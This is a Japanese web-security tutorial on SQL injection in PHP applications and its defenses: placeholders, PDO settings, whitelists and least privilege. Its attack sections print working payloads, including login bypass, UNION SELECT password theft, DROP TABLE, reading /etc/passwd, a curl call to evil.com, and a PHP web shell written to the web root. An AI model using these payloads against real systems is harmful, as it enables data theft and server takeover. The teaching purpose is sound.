    20 インジェクション

    SQLインジェクション

    SQLインジェクションは、Webアプリが組み立てる SQL 文に悪意ある入力を混ぜ込み、データベースを不正に操作する攻撃です。情報の窃取・認証回避・データ改ざんから、OS コマンドの実行やファイルの読み書きまで、どんな被害が起きるのかを見たうえで、根本対策の「プレースホルダ」、PHP の PDO の安全な設定、LIKE 検索・動的な検索条件・ソートの注意点、被害を小さくする保険的対策までを順に解説します。最後に XSS と並べて「同じ形の穴」として整理し、AI にコードを書かせたときの確認ポイントも紹介します。

    もとにしたノート：20_インジェクション/03_SQL呼び出しに伴う脆弱性（徳丸本7章）・04_SQLインジェクションとXSS（ねる前エンジニアリング）

    ひとことで言うと

    SQLインジェクションは、データのつもりで入れた文字が、データベースに「命令」として読まれてしまう 穴です。対策の基本は、SQL の命令部分と値を そもそも混ぜない こと。値は プレースホルダ を使って命令とは「別の便」で渡します。「記号を消す」より「混ぜない」が基本です。

    この章（徳丸本 第7章）の前に、第4章（00_全体像/02_Webアプリの機能と脆弱性）ではインジェクション系脆弱性の概要を、第5章・第6章では XSS を学びました（→ XSSの基本、XSS発展編）。このページでは SQL 呼び出しに伴う脆弱性、とくに SQLインジェクション の攻撃手法と対策を扱います。インジェクション全体の考え方（データとコードの混在）は インジェクションと暗号化の不備 にまとめてあるので、ここでは SQL に特有の話を中心に進めます。

    1.SQLインジェクションとは

    SQLインジェクション（SQL Injection） は、Webアプリケーションが生成する SQL 文に 悪意ある入力を混入 させ、データベースを不正操作する攻撃です。SQL とは、データベースに「このデータを探せ」「この行を書き換えろ」と指示するための言語です。

    項目内容
    分類インジェクション系脆弱性
    インターフェースSQL
    悪用手口SQL 文・SQL コマンドの注入

    1.1 実務でありそうな場面

    • 管理画面の会員検索欄に記号を入れたら、名前と関係なく 全員分のデータ が出てきた
    • 口コミのコメント欄に書かれたコメントを別の人が開いたら、中身がプログラムとして動き出した（こちらは XSS です。XSSの基本 で扱います）
    • AI に検索処理を書かせたら、入力をそのまま文字列につないで命令を作っていた

    1つ目と3つ目が SQLインジェクションです。3つとも根っこは同じで、「データのつもりの文字が命令として読まれる」ことが原因です（12章で並べて整理します）。

    1.2 なぜ起きるか

    ✕ 脆弱：ユーザー入力を SQL 文字列に直接連結

    // ❌ 脆弱：ユーザー入力を SQL 文字列に直接連結
$sql = "SELECT * FROM users WHERE username = '" . $_POST['username'] . "'";

    PHP の . は文字列をつなぐ演算子、$_POST['username'] はフォームから送られてきたユーザー名です。

    ユーザー入力 → SQL 文字列に連結 → DB が入力を「命令」として解釈 → 不正操作

    根本原因

    SQL の 命令部分 と データ部分 を分離せず、ユーザー入力をそのまま SQL に埋め込んでいることです。

    2.攻撃を読むための SQL の基本

    2.1 SQL の基本

    SELECT * FROM users
WHERE username = 'alice'
  AND password = 'password123'

    「users 表から、ユーザー名が alice で、かつパスワードが password123 の行をすべて（*）取り出せ」という意味です。攻撃でよく使われる記号・キーワードは次のとおりです。

    記号・キーワード意味
    '...'文字列リテラル（シングルクォートで囲む）
    --行コメント（以降を無視）
    OR「または」条件
    1=1常に真（TRUE）
    ;SQL 文の区切り
    UNION2つの SELECT 結果を結合

    リテラル とは、プログラムや SQL の中に直接書いた値のことです。

    2.2 入力が「囲い」を内側から越える

    プログラムは「名前がこれの人を探せ」という ひな型 の空いた部分に入力をはめ込みます。名前は引用符で囲まれ、囲いの中がデータ です。

    • 入力に ' OR 1=1 のような記号を入れると、先頭の引用符で囲いが閉じ、OR 1=1 が囲いの外に出て 命令として読まれます
    • 1=1 は常に正しいので、全員分のデータが返ります。ひな型は何も壊れていないのに、入力が境界を内側から越えてしまうのです
    • 入れた側の気持ちでは全体が「名前」のつもりでも、データベースにはどこまでが入力だったかという区別は届きません。届くのはただの1本の文字列です

    3.情報を盗む攻撃：エラーメッセージと UNION SELECT

    3.1 エラーメッセージ経由の情報漏洩

    SQL 実行時の 詳細なエラーメッセージ を画面に表示すると、攻撃者に SQLインジェクションの手がかり を与えます。

    漏洩する情報

    エラー内容攻撃者へのメリット
    テーブル名users 等の存在を確認
    カラム名password, email 等の構造を推測
    SQL 文の断片注入ポイントの特定
    DB の種類MySQL / PostgreSQL 向け攻撃の選択

    テーブル はデータベースの表、カラム は表の列（項目）のことです。

    攻撃の流れ

    1. 攻撃者が意図的に不正入力を送る
   入力: '

2. DB がエラーを返す
   エラー: You have an error in your SQL syntax near ''' at line 1

3. 攻撃者が SQL 構造を推測
   → username = '...' 形式だと分かる

4. 段階的に攻撃を洗練
   ' OR '1'='1' --
   ' UNION SELECT ...

    対策

    • 本番環境では 詳細エラーを画面に表示しない
    • エラー詳細は サーバーログ に記録
    • ユーザーには汎用メッセージのみ表示

    具体的なコードは 8.2 と 11.2 で扱います。エラー処理全般の考え方は ログ不足・SSRF・例外処理 を参照してください。

    3.2 UNION SELECT を用いた情報漏洩

    UNION SELECT を悪用すると、本来アクセスできない 他テーブルのデータ を取得できます。

    UNION とは

    -- 2つの SELECT 結果を縦に結合
SELECT name, email FROM users WHERE id = 1
UNION
SELECT username, password FROM admin_users;

    条件： 両方の SELECT の 列数と型 が一致している必要があります。

    攻撃例

    -- 脆弱な SQL
SELECT * FROM products WHERE name = '$input'

-- 攻撃入力
' UNION SELECT username, password, email, null FROM users --

-- 生成される SQL
SELECT * FROM products WHERE name = ''
UNION SELECT username, password, email, null FROM users --'

    商品検索のつもりの画面に、users 表のユーザー名・パスワード・メールアドレスが「商品」として並んでしまいます。null は列数を合わせるための埋め草です。

    攻撃の手順

    1. 列数を特定（ORDER BY 1, ORDER BY 2, ... でエラーが出るまで試行）
2. 表示可能な列を特定
3. UNION SELECT で機密データを取得

    被害

    • ユーザーテーブル全件の漏洩
    • パスワードハッシュの取得
    • 管理者アカウント情報の窃取

    4.認証回避とデータ改ざん

    4.1 SQLインジェクションによる認証回避

    ログイン処理は SQLインジェクションの 最も典型的な標的 です。

    ✕ 脆弱なログイン処理

    $sql = "SELECT * FROM users WHERE username = '" . $_POST['username'] . "'
        AND password = '" . $_POST['password'] . "'";

    攻撃入力

    ユーザー名: admin' --
パスワード: （任意・空でも可）

    生成される SQL

    SELECT * FROM users WHERE username = 'admin' --'
AND password = '...'
--            ↑ ここ以降はコメントアウト（パスワード条件が無効）

    コメントアウト とは、-- 以降をコメント扱いにして無視させることです。パスワードの条件が消え、admin としてログインできてしまいます。

    別パターン

    ユーザー名: ' OR '1'='1' --
→ WHERE 条件が常に TRUE になり、最初のユーザーでログイン成功

    対策

    • プレースホルダ で SQL とデータを分離（7章）
    • パスワードは ハッシュ比較（平文保存は別問題として避ける。→ インジェクションと暗号化の不備 の「パスワードを平文で保存しない」）

    4.2 SQLインジェクション攻撃によるデータ改ざん

    SQLインジェクションは データの読み取り（SELECT） だけでなく、改ざん・削除 も可能です。

    UPDATE / DELETE の注入

    -- プロフィール更新（脆弱）
UPDATE users SET email = '$input' WHERE id = $userId

-- 攻撃入力
', is_admin = 1 WHERE id = 1 --

-- 結果：管理者権限が付与される

    生成される SQL は UPDATE users SET email = '', is_admin = 1 WHERE id = 1 --' WHERE id = … となり、本来の WHERE 条件はコメントで無効になります。

    DROP TABLE

    -- 攻撃入力
'; DROP TABLE users; --

-- 複文が実行可能な環境ではテーブルごと削除

    複文 とは、; で区切った複数の SQL 文を一度に実行することです（8.3 で禁止方法を扱います）。

    INSERT の注入

    -- 攻撃者が管理者アカウントを直接 INSERT
'; INSERT INTO users (username, is_admin) VALUES ('hacker', 1); --

    被害

    操作被害
    UPDATE権限昇格、データ書き換え
    DELETEデータの大量削除
    INSERT不正アカウントの作成
    DROPテーブル・DB の破壊

    5.データベースの外まで広がる被害

    DBMS（データベース管理システム。MySQL・PostgreSQL・SQL Server など）の機能や設定によっては、被害はデータベースの中だけにとどまりません。

    5.1 SQL コマンドの実行（OS コマンド）

    DBMS によっては、SQLインジェクション経由で OS コマンド（サーバーの OS に直接出す命令）を実行できる場合があります。

    MySQL の例

    -- UDF（User Defined Function）や特定設定が有効な場合
SELECT sys_exec('id');

    SQL Server の例

    -- xp_cmdshell（有効な場合）
EXEC xp_cmdshell 'whoami';

    PostgreSQL の例

    COPY ... FROM PROGRAM 'curl http://evil.com'

    UDF は利用者が追加できる独自関数、id・whoami は「今どのユーザーで動いているか」を表示する OS コマンドです。

    条件

    条件説明
    DB ユーザーの権限SUPER 権限等が必要なことが多い
    DBMS の設定危険な機能が有効化されている
    複文実行; で複数 SQL を実行できる

    対策： 最小権限の DB ユーザー ＋ 複文実行の禁止 ＋ プレースホルダ。OS コマンドを直接呼び出す処理の脆弱性は OSコマンドインジェクション で扱います。

    5.2 ファイルの読み出し、書き出し

    MySQL 等では、SQLインジェクション経由で サーバー上のファイル にアクセスされる恐れがあります。

    ファイル読み出し（MySQL）

    -- LOAD_FILE 関数
' UNION SELECT LOAD_FILE('/etc/passwd'), null, null --

    ファイル書き出し（MySQL）

    -- INTO OUTFILE
' UNION SELECT '<?php system($_GET["c"]); ?>', null
INTO OUTFILE '/var/www/html/shell.php' --

    書き出しの例は、URL で渡したコマンドを実行する PHP ファイル（Web シェル）を公開フォルダに置く攻撃です。置かれてしまうと、サーバーを外から自由に操作されます。

    条件

    操作必要な条件
    LOAD_FILEFILE 権限、secure_file_priv の設定
    INTO OUTFILEFILE 権限、書き込み可能なディレクトリ

    対策

    • DB ユーザーに FILE 権限を与えない
    • secure_file_priv（MySQL がファイルを読み書きできる場所を制限する設定）を適切に設定
    • Web ルート（公開フォルダ）への書き込み権限を DB ユーザーに与えない

    アプリ自身のファイル読み書きにまつわる脆弱性は、ファイルアクセスとディレクトリトラバーサル で扱います。

    5.3 HTTP リクエストにより他のサーバーを攻撃

    SQLインジェクションを踏み台に、他のサーバーへ HTTP リクエスト を送る攻撃（SSRF に近い）もあります。SSRF（サーバーサイドリクエストフォージェリ）は、サーバーに攻撃者の望む宛先へ通信させる攻撃で、SSRF のページで扱います（概要は ログ不足・SSRF・例外処理）。

    -- MySQL の LOAD DATA INFILE や UDF 経由
-- SQL Server の OLE Automation 等

-- 概念例：DB 機能を使った外部通信
SELECT http_get('http://internal-server/admin/delete?id=1');

    補足：LOAD DATA INFILE は通信の機能ではありません

    ノートの例に挙がっている MySQL の LOAD DATA INFILE は、ファイルを表に取り込む機能で、それ自体は HTTP 通信をしません。外部通信に使われるのは、UDF（独自関数）や SQL Server の OLE Automation、Oracle の UTL_HTTP のような通信用の機能です。http_get も、こうした拡張で追加される関数をイメージした 概念例 です。

    被害

    被害説明
    内部ネットワークのスキャンファイアウォール内のサーバーへアクセス
    内部 API の不正呼び出し認証なしの内部サービスを攻撃
    ポートスキャンネットワーク構成の把握

    対策

    • DB から外部ネットワークへの通信を 制限
    • 最小権限 ＋ 危険な拡張機能の無効化

    6.注入ポイント：文字リテラルと数値項目

    6.1 文字リテラルの問題

    SQLインジェクションが最も起きやすいのは、文字列リテラル（'...'） にユーザー入力を埋め込む場合です。

    ✕ 脆弱なパターン

    $name = $_GET['name'];
$sql = "SELECT * FROM users WHERE name = '$name'";

    攻撃の仕組み

    正常:  WHERE name = 'alice'
攻撃:  WHERE name = 'alice' OR '1'='1' --'
              ↑ シングルクォートで文字列を閉じ、SQL を注入

    対策

    対策説明
    プレースホルダデータを SQL 命令と分離（根本対策）
    エスケープ' を '' に変換（プレースホルダの補助、単独では非推奨）

    エスケープ とは、特別な意味を持つ記号を「ただの文字」として扱われる形に書き換えることです。SQL では ' を2つ重ねると、文字としての ' になります。

    ✕ エスケープのみに頼る（非推奨）

    // ❌ エスケープのみに頼る（非推奨）
$name = str_replace("'", "''", $_GET['name']);

    ○ プレースホルダを使う

    // ✅ プレースホルダを使う
$stmt = $pdo->prepare('SELECT * FROM users WHERE name = ?');
$stmt->execute([$_GET['name']]);

    「引用符を消せばよいのでは？」

    昔は、危険な記号を無害な形に書き換える対策も使われていました。しかしこれは、危ない記号をすべて自分で見つける ことが前提で、1か所でも忘れたらそこから入られます。記号の書き方には思わぬ抜け道もあります。一方、命令と値を分ける方法は 仕組みで区別 するので、コードを見て「つないでいるか」だけ確かめればよく、問題も見つけやすいのです。

    6.2 数値項目に対する SQLインジェクション

    数値項目は引用符で囲まないため 文字列リテラルより安全に見えますが、検証を怠ると SQLインジェクションが成立します。囲いがない分、閉じる必要すらありません。

    ✕ 脆弱なパターン

    $id = $_GET['id'];
$sql = "SELECT * FROM products WHERE id = $id";  // 引用符なし

    攻撃入力

    ?id=1 OR 1=1
?id=1; DROP TABLE products; --
?id=1 UNION SELECT username, password FROM users

    生成される SQL

    SELECT * FROM products WHERE id = 1 OR 1=1
-- 全商品が返る

SELECT * FROM products WHERE id = 1; DROP TABLE products; --
-- テーブル削除（複文実行が可能な場合）

    対策

    ○ 型検証 ＋ プレースホルダ

    // ✅ 数値として検証してから使用
$id = filter_var($_GET['id'], FILTER_VALIDATE_INT);
if ($id === false) {
    die('不正な ID です');
}

// ✅ さらにプレースホルダを使う（推奨）
$stmt = $pdo->prepare('SELECT * FROM products WHERE id = ?');
$stmt->execute([$id]);

    filter_var(…, FILTER_VALIDATE_INT) は、値が整数として正しければその整数を、そうでなければ false を返す PHP の関数です。

    原則

    数値項目でも 型検証 ＋ プレースホルダ を使います。

    7.根本対策：プレースホルダによる SQL 文の組み立て

    プレースホルダ（値の置き場所を示す印。? などで書く）を使って SQL を組み立てる方式は プリペアドステートメント（Prepared Statement） とも呼ばれ、SQLインジェクション対策の 最も重要な手法 です。

    7.1 仕組み

    ① SQL の「骨格」を先に DB に送る
   SELECT * FROM users WHERE username = ? AND password = ?

② プレースホルダ（?）の位置が確定 → SQL の意味が固定

③ データを後からバインド
   'alice', 'password123'

④ データは「値」としてのみ扱われ、SQL 命令として解釈されない

    バインド とは、プレースホルダに実際の値を結びつけることです。

    • 危ない書き方： ひな型の文字列と入力を 足し算でつなぐ。つないだ瞬間にデータと命令の区別が消え、混ざった1本の文字列が DB に届きます
    • 安全な書き方： 名前の場所にプレースホルダを置き、値は命令とは 別の便 で渡します。先に命令だけが DB に渡って形が確定し、後から届いた値はどんな記号でもただの文字として扱われ、「該当なし」になります。入力は命令の形を変えられません

    7.2 PHP（PDO）の例

    PDO（PHP Data Objects） は、PHP からいろいろなデータベースを同じ書き方で扱うための標準機能です。prepare で骨格を渡し、execute で値を渡します。

    ○ 安全

    // ✅ 安全
$stmt = $pdo->prepare('SELECT * FROM users WHERE username = ? AND password = ?');
$stmt->execute([$username, $password]);

    ○ 名前付きプレースホルダ

    // 名前付きプレースホルダ
$stmt = $pdo->prepare('SELECT * FROM users WHERE username = :name');
$stmt->execute(['name' => $username]);

    名前付きプレースホルダは ? の代わりに :name のような名前で場所を示す書き方で、値が多いときに取り違えにくくなります。

    7.3 攻撃入力が無害化される例

    入力: admin' OR '1'='1' --

プレースホルダ使用時:
  → 文字列「admin' OR '1'='1' --」というユーザー名を検索するだけ
  → SQL 命令として解釈されない ✅

    ほかの言語（Node.js など）での書き方や、ORM（データベース操作をオブジェクトとして書ける仕組み）の注意点は インジェクションと暗号化の不備 の「SQL インジェクション：脆弱なコードと安全なコード」を参照してください。

    8.PDO の安全な使い方

    8.1 PDO のオプション

    PHP の PDO を使う場合、オプション設定 によって安全性が大きく変わります。

    ○ 推奨設定

    $pdo = new PDO($dsn, $user, $pass, [
    // ① ネイティブプリペアドステートメント（静的プレースホルダ）
    PDO::ATTR_EMULATE_PREPARES => false,

    // ② 例外モード
    PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,

    // ③ デフォルトフェッチモード（任意）
    PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
]);

    $dsn は接続先（DB の種類・ホスト・DB 名）を表す文字列、フェッチ は検索結果を1行ずつ取り出すことです。

    オプション推奨値効果
    ATTR_EMULATE_PREPARESfalseDB 側でプリペア（静的プレースホルダ）
    ATTR_ERRMODEERRMODE_EXCEPTIONエラーを例外として扱う
    ATTR_DEFAULT_FETCH_MODEFETCH_ASSOC連想配列で取得

    8.2 PDO で例外処理を使用する

    PDO::ATTR_ERRMODE を 例外モード に設定すると、エラーを適切に処理できます。例外 とは、処理の失敗をプログラムに知らせる仕組みで、try の中で起きた失敗を catch で受け止めます。

    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    ○ 安全な例外処理

    try {
    $stmt = $pdo->prepare('SELECT * FROM users WHERE id = ?');
    $stmt->execute([$id]);
    $user = $stmt->fetch();
} catch (PDOException $e) {
    // ❌ 詳細をユーザーに表示しない
    // echo $e->getMessage();

    // ✅ ログに記録し、汎用メッセージを表示
    error_log($e->getMessage());
    echo '処理中にエラーが発生しました。';
}
    例外モードの利点説明
    エラーの見落とし防止失敗時に処理が続行されない
    一貫したエラー処理try-catch で統一的に処理
    情報漏洩の防止詳細をログのみに記録

    8.3 複文の実行を禁止する

    複文（複数 SQL の連続実行） が可能だと、; DROP TABLE 等の攻撃が成立しやすくなります。

    ✕ 危険な例

    SELECT * FROM users WHERE id = 1; DROP TABLE users; --
    対策説明
    プレースホルダ1 文ずつ実行
    mysqlnd の設定PDO::MYSQL_ATTR_MULTI_STATEMENTS => false（MySQL）
    DB ユーザー権限不要な権限を剥奪

    mysqlnd は PHP が MySQL と通信するためのドライバ（接続部品）です。

    ○ MySQL：複文実行を禁止

    // MySQL：複文実行を禁止
$pdo = new PDO($dsn, $user, $pass, [
    PDO::ATTR_EMULATE_PREPARES => false,
    PDO::MYSQL_ATTR_MULTI_STATEMENTS => false,
]);

    9.静的プレースホルダと動的プレースホルダ

    9.1 静的プレースホルダを指定する

    静的プレースホルダ とは、DB サーバー側で SQL を 事前コンパイル（実行できる形に解析しておくこと）し、プレースホルダの位置を固定する方式です。

    PDO::ATTR_EMULATE_PREPARES => false  // 静的（ネイティブ）プレースホルダ

    静的プレースホルダの流れ

    1. PREPARE: SELECT * FROM users WHERE id = ?
   → DB が SQL 構造をコンパイル

2. EXECUTE: [123]
   → データのみバインドして実行

3. EXECUTE: [456]
   → 同じ SQL に別データをバインド（再利用可能）

    9.2 静的と動的の違い

    PDO には エミュレート（模擬） モードがあり、動作が異なります。エミュレートモードのプレースホルダを 動的プレースホルダ と呼びます。

    静的プレースホルダ動的プレースホルダ（エミュレート）
    設定EMULATE_PREPARES = falseEMULATE_PREPARES = true（一部環境のデフォルト）
    処理場所DB サーバーPHP（クライアント）側
    SQL コンパイルDB が事前にコンパイルPHP が ? を置換してから送信
    安全性高い（推奨）設定次第でリスクあり
    同一 SQL の再利用効率的毎回置換

    動的（エミュレート）の問題

    EMULATE_PREPARES = true の場合:
  PHP が ? を値に置換してから DB に送る
  → 実装によってはエスケープ漏れのリスク
  → 必ず false に設定する

    動的プレースホルダも、PHP が値を正しくエスケープしてくれる限りは安全ですが、文字コードの設定などによっては漏れが生じる余地があります。DB 側で構造と値を分ける静的プレースホルダなら、原理的に入力が SQL の形を変えられません。

    推奨

    常に PDO::ATTR_EMULATE_PREPARES => false を指定します。

    10.検索とソートで注意すること

    10.1 ワイルドカードのエスケープが必要な文字

    LIKE 句（「〜を含む」のような部分一致検索の書き方）では、% と _ が ワイルドカード（任意の文字にマッチする特別な記号）として特別な意味を持ちます。

    文字意味
    %任意の 0 文字以上
    _任意の 1 文字

    問題

    // ユーザーが「100%」を検索
$keyword = '100%';
$sql = "SELECT * FROM products WHERE name LIKE '%$keyword%'";
// → LIKE '%100%%' となり「100」で始まるすべてにマッチ

    補足：マッチする範囲の訂正

    LIKE '%100%%' は先頭にも % があるので、「100 で始まる」ではなく 「100 を含むすべて」 にマッチします（末尾の %% は % 1つと同じ意味）。いずれにせよ、利用者が探したかった「100%」という文字を含む商品だけには絞れません。

    対策：ESCAPE 句

    ○ ワイルドカードをエスケープ

    // ✅ ワイルドカードをエスケープ
$keyword = str_replace(['\\', '%', '_'], ['\\\\', '\\%', '\\_'], $userInput);
$stmt = $pdo->prepare('SELECT * FROM products WHERE name LIKE ? ESCAPE \'\\\'');
$stmt->execute(['%' . $keyword . '%']);

    ESCAPE 句は「この文字の直後の % や _ はただの文字として扱う」という指定です。

    エスケープが必要な文字エスケープ後
    \\\
    %\%
    _\_

    補足：MySQL での ESCAPE 句の書き方

    上の PHP コードで DB に届く SQL は ESCAPE '\' です。MySQL は標準設定だと文字列中の \ を「次の文字をエスケープする記号」として扱うため、'\' は閉じ引用符まで飲み込んで構文エラーになります。MySQL では ESCAPE '\\' と書く（または MySQL の LIKE は既定で \ がエスケープ文字なので ESCAPE 句を省く）必要があります。DB ごとの差を避けたいなら、エスケープ文字に # など \ 以外を使い、#・%・_ の前に # を付ける方法もあります。

    注意

    LIKE 用のエスケープは プレースホルダとは別 の処理です。プレースホルダで SQL の注入を防ぎ、LIKE 用にワイルドカードをエスケープします。

    10.2 検索条件が動的に変わる場合

    「キーワード」「カテゴリ」「価格帯」など、条件の組み合わせが可変 する検索では、SQL の組み立て方に注意が必要です。

    ✕ 危険なパターン

    // ❌ 列名をユーザー入力から構成
$column = $_GET['field'];
$sql = "SELECT * FROM products WHERE $column = ?";  // 列名はプレースホルダ不可！

    プレースホルダに入れられるのは 値 だけで、列名やテーブル名のような SQL の構造部分 には使えません。そのため列名は別の方法で守ります。

    ○ 安全なパターン

    // ✅ 列名はホワイトリストで検証
$allowedFields = ['name', 'category', 'price'];
$field = $_GET['field'];
if (!in_array($field, $allowedFields, true)) {
    die('不正な検索項目です');
}

$conditions = [];
$params = [];

if (!empty($_GET['name'])) {
    $conditions[] = 'name LIKE ?';
    $params[] = '%' . escapeLike($_GET['name']) . '%';
}
if (!empty($_GET['category'])) {
    $conditions[] = 'category = ?';
    $params[] = $_GET['category'];
}

$where = $conditions ? 'WHERE ' . implode(' AND ', $conditions) : '';
$sql = "SELECT * FROM products $where";
$stmt = $pdo->prepare($sql);
$stmt->execute($params);

    ホワイトリスト（許可リスト） とは、「使ってよいもの」を先に列挙し、それ以外をすべて拒否する方式です。SQL に並べる条件の文字列（'name LIKE ?' など）はコード側で固定し、利用者の入力は $params に入れてプレースホルダで渡しています。escapeLike() は、10.1 のワイルドカードのエスケープ処理を関数にまとめたものを想定しています。

    項目対策
    値プレースホルダ
    列名・テーブル名ホワイトリスト
    演算子（AND/OR）コード側で固定
    LIKE パターンワイルドカードエスケープ

    10.3 様々な列でのソート

    ORDER BY 句（並べ替えの指定）にユーザー入力をそのまま使うと、SQLインジェクションの原因になります。

    ✕ 危険なパターン

    // ❌ 脆弱
$sort = $_GET['sort'];
$sql = "SELECT * FROM products ORDER BY $sort";
// 攻撃: ?sort=price; DROP TABLE products; --

    ○ 安全なパターン

    // ✅ ソート列をホワイトリストで限定
$allowedSort = [
    'name'  => 'name ASC',
    'price' => 'price ASC',
    'date'  => 'created_at DESC',
];
$sort = $_GET['sort'] ?? 'name';
$orderBy = $allowedSort[$sort] ?? $allowedSort['name'];

$sql = "SELECT * FROM products ORDER BY $orderBy";
// 列名はホワイトリストから選ばれた固定値のみ

    ?? は「左側が未定義なら右側を使う」という PHP の演算子です。利用者が送った値は「どれを選ぶか」の鍵としてだけ使われ、SQL に入るのはコードに書いた固定の文字列だけです。

    昇順・降順の切り替え

    ○ 列名も方向も許可リストから選ぶ

    $allowedColumns = ['name', 'price', 'created_at'];
$column = $_GET['column'] ?? 'name';
$dir = ($_GET['dir'] ?? 'asc') === 'desc' ? 'DESC' : 'ASC';

if (!in_array($column, $allowedColumns, true)) {
    $column = 'name';
}

$sql = "SELECT * FROM products ORDER BY $column $dir";

    原則

    ORDER BY の 列名・方向 はユーザー入力を直接使わず、許可リストから選択 します。

    11.保険的対策

    11.1 SQLインジェクション保険的対策とは

    プレースホルダ が根本対策ですが、万が一の被害を 軽減する保険 も重要です。

    根本対策:  プレースホルダ（Prepared Statement）
保険的対策: エラー抑止、入力検証、DB 権限設定

    複数の守りを重ねる考え方は 深層防御 で詳しく扱っています。

    11.2 詳細なエラーメッセージの抑止

    本番環境では DB エラーの 詳細をユーザーに見せない ようにします。

    ○ 本番環境の設定

    // 本番環境
ini_set('display_errors', '0');
$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

try {
    // DB 処理
} catch (PDOException $e) {
    error_log($e->getMessage());  // ログのみ
    http_response_code(500);
    echo 'エラーが発生しました。';
}

    display_errors は PHP のエラーを画面に出すかどうかの設定、500 は「サーバー内部エラー」を表す HTTP ステータスコードです。

    環境表示
    開発詳細エラー表示（デバッグ用）
    本番汎用メッセージのみ

    11.3 入力値の妥当性の検証

    プレースホルダの 補助 として、第4章（00_全体像/02_Webアプリの機能と脆弱性）で学んだ入力値検証を行います。

    項目検証
    ID整数か、正の値か
    ページ番号1〜9999 の範囲
    ソート項目許可リストに含まれるか
    検索キーワード最大文字数

    ○ ID の検証

    $id = filter_var($_GET['id'], FILTER_VALIDATE_INT);
if ($id === false || $id < 1) {
    die('不正な ID です');
}

    注意

    入力値検証だけでは SQLインジェクションを完全に防げません。たとえば名前欄では ' を含む名前（O'Brien など）も正当な入力なので、検証で弾けないことがあります。必ず プレースホルダと併用 します。

    11.4 データベースの権限設定

    DB ユーザーには 必要最小限の権限 のみを付与します。万が一 SQLインジェクションが成功しても 被害を限定 できます。最小権限の原則そのものは 最小権限とデータ最小化（「データベースのアカウント」の項）を参照してください。

    権限Web アプリ用 DB ユーザー
    SELECT必要なテーブルのみ
    INSERT / UPDATE / DELETE必要なテーブルのみ
    DROP / CREATE / ALTER❌ 付与しない
    FILE❌ 付与しない
    SUPER / SHUTDOWN❌ 付与しない
    GRANT❌ 付与しない

    ○ 例（MySQL）

    -- アプリ専用ユーザーを作成
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'strong_password';

-- 必要な操作のみ許可
GRANT SELECT, INSERT, UPDATE, DELETE ON myapp.* TO 'webapp'@'localhost';

-- 管理用ユーザーとは別アカウントにする

    多層防御

    1. プレースホルダ → 攻撃そのものを防ぐ
    2. 入力値検証 → 不正入力を早期に弾く
    3. エラー抑止 → 情報漏洩を防ぐ
    4. 最小権限 → 突破されても被害を限定

    12.XSS と並べて見る・AI に書かせたとき

    12.1 2つを並べると

    SQLインジェクションと XSS（→ XSSの基本）は、根っこが同じ「データが命令として読まれる」穴です。

    SQLインジェクションXSS
    読み手データベース見た人のブラウザ
    化ける記号引用符尖った括弧
    対策値を別の便で渡す文字として表示する形に変える
    被害データを抜かれる・消される見た人の画面で勝手にプログラムが動く

    読み手が違うだけで、やっていることは同じです。どちらも データと命令の境界ではっきり分ける ことが対策になります。

    12.2 AI に書かせたとき見るところ

    1. SQL や HTML を入力とつないで作っていないか。 足し算だけでなく、テンプレート文字列（バッククォート `…${…}`）の中に埋め込む書き方も同じです。動くけれど境界が消えていることがあり、動くから気づきにくいのです
    2. innerHTML や dangerously で始まる書き方を使っていないか。 使うなら、本当に HTML として入れる必要があるのか理由を聞きます（XSS 側の確認点です）
    3. 「入力をチェックしたから安全」で済ませていないか。 チェックは大事ですが、それだけに頼ると1か所の漏れで終わりです。チェックしたうえで境界でも分ける 二重の守り が基本です（チェックは入口、分けるのは最後の砦）
    4. 便利な部品（DB を楽に扱う部品など）の抜け道を使っていないか。 生の SQL を書ける機能で値をつないでいたら、部品を使っていても同じ穴が開きます

    ✕ テンプレート文字列でも「つないでいる」のと同じ

    const sql = `SELECT * FROM users WHERE name = '${name}'`;

    ○ 値は別の便で渡す

    const result = await db.query('SELECT * FROM users WHERE name = ?', [name]);

    12.3 動画のまとめ

    • 原因は、データのつもりの文字が命令として読まれること（入力がデータと命令の境界を越える）
    • SQLインジェクションの読み手は DB、XSS の読み手はコメントを見た人のブラウザ
    • 対策は境界で分けること。SQL は値を別の便で、HTML は文字として表示する形に。消すより混ぜない
    • 攻撃手法のカタログは覚えなくてよい。境界がどこにあるかを見れば、新しい手口にも対応できる

    トピック要点
    SQLインジェクション悪意ある SQL を注入して DB を不正操作
    エラーメッセージ経由詳細エラーが SQL 構造の手がかりになる

    13.1 対策の優先順位

    1. プレースホルダによる SQL 文組み立て（必須）
    2. PDO：EMULATE_PREPARES = false、例外処理、複文禁止
    3. 動的な列名・ORDER BY はホワイトリスト
    4. LIKE 検索はワイルドカードをエスケープ
    5. 詳細エラーを抑止
    6. 入力値の妥当性検証（補助）
    7. DB ユーザーの最小権限（保険）

    このページの要点

    • 原因は、入力が SQL の 命令部分とデータ部分の境界を越える こと
    • 根本対策は プレースホルダ。PDO では 静的プレースホルダ（EMULATE_PREPARES => false） にする
    • 列名・ORDER BY などプレースホルダが使えない場所は ホワイトリスト
    • エラー抑止・入力検証・最小権限は、突破されたときの 保険

    14.理解度チェック

    Q1. ログイン画面のユーザー名に admin' -- と入れると、なぜパスワードなしでログインできてしまうのですか？

    ' でユーザー名の文字列が閉じられ、続く -- で後ろの AND password = '...' がコメントになって無視されるからです。SQL は「ユーザー名が admin の行」だけを探す文になり、パスワードの条件が消えます。

    Q2. 数値の ID は引用符で囲まないので安全、という考えはなぜ誤りですか？

    囲いがないので、閉じる必要すらなく 1 OR 1=1 や 1 UNION SELECT … をそのまま SQL として読ませられるからです。FILTER_VALIDATE_INT などの型検証とプレースホルダを併用します。

    Q3. プレースホルダを使うと、' OR '1'='1' -- のような入力はどう扱われますか？

    SQL の骨格が先に DB に渡って形が確定しているので、値は後から ? に入る「ただの文字」として扱われます。「' OR '1'='1' -- という名前の人」を探すだけで、該当なしになります。

    Q4. PDO で PDO::ATTR_EMULATE_PREPARES => false を指定するのはなぜですか？

    静的プレースホルダにするためです。true（動的・エミュレート）だと PHP 側で ? を値に置換した1本の SQL が送られ、実装によってはエスケープ漏れのリスクがあります。false なら DB サーバーが構造を先にコンパイルし、値は別に渡されます。

